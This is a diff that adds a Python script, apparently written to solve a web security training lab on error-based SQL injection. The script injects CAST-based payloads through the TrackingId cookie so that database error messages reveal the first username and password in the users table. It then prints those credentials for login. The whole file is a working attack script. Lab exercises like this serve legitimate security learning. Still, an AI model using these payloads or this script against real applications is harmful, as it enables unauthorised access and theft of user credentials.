@@ -1,0 +1,67 @@
+import requests
+import re
+
+base_url = input("Enter the base URL of the lab (e.g. https://xxxx.web-security-academy.net): ").rstrip("/")
+session = requests.Session()
+
+print("[*] Fetching home page to obtain a valid TrackingId cookie...")
+home_response = session.get(base_url)
+original_tracking_id = session.cookies.get("TrackingId")
+
+if not original_tracking_id:
+    print("==> Error: No TrackingId cookie was set by the server.")
+    exit()
+
+print(f"[*] Original TrackingId: {original_tracking_id}")
+
+
+def send_payload(sql_payload):
+    """
+    Sends a request with the TrackingId cookie set to the given raw payload
+    (the original cookie value is dropped entirely, as the walkthrough does,
+    to free up character space). Returns the response object.
+    """
+    cookies = {"TrackingId": sql_payload}
+    response = requests.get(base_url, cookies=cookies)
+    return response
+
+print("\n[*] Step 1: Sending a single quote to confirm an error occurs...")
+test_response = send_payload("x'")
+print(f"    Status code: {test_response.status_code}")
+if test_response.status_code != 500:
+    print("==> Warning: Expected an error here. Continuing anyway, but double-check manually.")
+
+print("\n[*] Step 2: Leaking the first username via CAST error...")
+username_payload = "' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--"
+username_response = send_payload(username_payload)
+print(f"    Status code: {username_response.status_code}")
+username_match = re.search(r'invalid input syntax for type integer: "([^"]+)"', username_response.text)
+
+if not username_match:
+    print("==> Error: Could not find the expected error message in the response.")
+    print("    Raw response snippet:")
+    print(username_response.text[:1000])
+    exit()
+
+leaked_username = username_match.group(1)
+print(f"[+] Leaked username: {leaked_username}")
+
+print("\n[*] Step 3: Leaking the password via CAST error...")
+password_payload = "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
+password_response = send_payload(password_payload)
+print(f"    Status code: {password_response.status_code}")
+
+password_match = re.search(r'invalid input syntax for type integer: "([^"]+)"', password_response.text)
+
+if not password_match:
+    print("==> Error: Could not find the expected error message in the response.")
+    print("    Raw response snippet:")
+    print(password_response.text[:1000])
+    exit()
+
+leaked_password = password_match.group(1)
+print(f"[+] Leaked password: {leaked_password}")
+
+print(f"\n[+] Credentials -> username: {leaked_username} | password: {leaked_password}")
+print("[*] Go to the login page and log in manually with these credentials.")
+
